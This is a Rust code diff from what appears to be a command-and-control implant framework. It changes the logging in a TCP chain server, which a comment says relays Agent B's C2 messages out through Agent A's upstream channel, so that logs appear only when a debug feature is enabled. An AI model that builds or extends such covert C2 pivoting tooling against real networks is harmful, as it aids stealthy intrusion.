@@ -15,7 +15,7 @@ async fn handle_request(
     mut req: HyperRequest<Incoming>,
 ) -> Result<HyperResponse<Full<Bytes>>, Infallible> {
     let path = req.uri().path().to_string();
-    #[cfg(debug_assertions)]
+    #[cfg(feature = "print_debug")]
     log::debug!("[tcp-chain-server] incoming forward request: {}", path);
 
     let grpc_response = |body: Vec<u8>| {
@@ -28,7 +28,7 @@ async fn handle_request(
     };
 
     let _grpc_error = |code: u32, msg: String| {
-        #[cfg(debug_assertions)]
+        #[cfg(feature = "print_debug")]
         log::error!("tcp chain proxy: {} — {}", path, msg);
         HyperResponse::builder()
             .status(200)
@@ -46,9 +46,9 @@ async fn handle_request(
     let agent_clone = agent.clone();
 
     if let Err(e) = agent_clone.forward_raw(path_clone, rx_in, tx_out).await {
-        #[cfg(debug_assertions)]
+        #[cfg(feature = "print_debug")]
         log::error!("tcp forward_raw error: {}", e);
-        #[cfg(not(debug_assertions))]
+        #[cfg(not(feature = "print_debug"))]
         let _ = e;
     }
 
@@ -101,7 +101,7 @@ async fn handle_request(
 /// Agent B's C2 messages enter through the TCP socket and exit through
 /// Agent A's normal upstream channel.
 pub async fn start_tcp_chain_server(addr: &str, agent: Arc<dyn Agent>) -> Result<()> {
-    #[cfg(debug_assertions)]
+    #[cfg(feature = "print_debug")]
     log::info!(
         "[tcp-chain-server] connecting to Agent B's TCP listener at {}",
         addr
@@ -109,12 +109,12 @@ pub async fn start_tcp_chain_server(addr: &str, agent: Arc<dyn Agent>) -> Result
 
     let stream = match tokio::net::TcpStream::connect(addr).await {
         Ok(s) => {
-            #[cfg(debug_assertions)]
+            #[cfg(feature = "print_debug")]
             log::info!("[tcp-chain-server] connected to Agent B at {}", addr);
             s
         }
         Err(e) => {
-            #[cfg(debug_assertions)]
+            #[cfg(feature = "print_debug")]
             log::error!("[tcp-chain-server] connect error: {}", e);
             return Err(anyhow!(
                 "Failed to connect to Agent B TCP listener at {}: {}",
@@ -127,7 +127,7 @@ pub async fn start_tcp_chain_server(addr: &str, agent: Arc<dyn Agent>) -> Result
     let agent_clone = agent.clone();
     let io = TokioIo::new(stream);
 
-    #[cfg(debug_assertions)]
+    #[cfg(feature = "print_debug")]
     log::debug!("[tcp-chain-server] starting HTTP/2 on connection to Agent B");
     let service = service_fn(move |req| {
         let a = agent_clone.clone();
@@ -138,12 +138,12 @@ pub async fn start_tcp_chain_server(addr: &str, agent: Arc<dyn Agent>) -> Result
         .serve_connection(io, service)
         .await
     {
-        #[cfg(debug_assertions)]
+        #[cfg(feature = "print_debug")]
         log::error!("[tcp-chain-server] HTTP/2 connection error: {:?}", err);
         return Err(anyhow!("HTTP/2 connection to Agent B failed: {:?}", err));
     }
 
-    #[cfg(debug_assertions)]
+    #[cfg(feature = "print_debug")]
     log::info!("[tcp-chain-server] connection closed cleanly");
     Ok(())
 }
